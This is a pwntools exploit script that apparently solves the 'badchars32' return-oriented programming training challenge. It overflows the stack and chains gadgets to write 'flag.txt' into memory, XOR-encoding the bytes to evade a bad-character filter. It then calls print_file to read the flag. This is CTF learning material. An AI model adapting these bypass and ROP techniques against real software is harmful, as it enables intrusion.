#!/usr/bin/python3

from pwn import *

PROG_NAME = "./badchars32"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
	gdb.attach(p, '''break main''')

bad_bytes = b'xga.'
# ascii is 0-127, so we can just xor 128
bitmask = 1<<7

data_addr = 0x0804a018
mov_ptr_edi_addr = 0x0804854f # mov dword ptr [edi], esi; ret;
pop_esi_edi_ebp_addr = 0x080485b9 # pop esi; pop edi; pop ebp; ret;
xor_ptr_ebp_bl = 0x08048547 # xor byte ptr [ebp], bl; ret;
pop_ebp = 0x080485bb # pop ebp; ret;
pop_ebx = 0x0804839d # pop ebx; ret;
p.recvuntil(b'> ')

payload = b'A' * (0x28 + 0x4)

for i, string in enumerate([b'flag', b'.txt', b'\x00'*4]):
	# build our string, 4 bytes at a time

	payload += p32(pop_ebx)
	payload += p32(bitmask)
	payload += p32(pop_esi_edi_ebp_addr)

	# xor each byte to bypass badchars check
	for c in string:
		payload += p8(c ^ bitmask)

	payload += p32(data_addr + i*4)
	payload += b'AAAA'
	payload += p32(mov_ptr_edi_addr)

	for j in range(4):
		# in-memory data manipulation to undo xor
		payload += p32(pop_ebp)
		payload += p32(data_addr + i*4 + j)
		payload += p32(xor_ptr_ebp_bl)


# with our .data set up, we can call print_file
payload += p32(elf.symbols['print_file'])
payload += b'A' * 4
payload += p32(data_addr)

p.sendline(payload)

p.interactive()
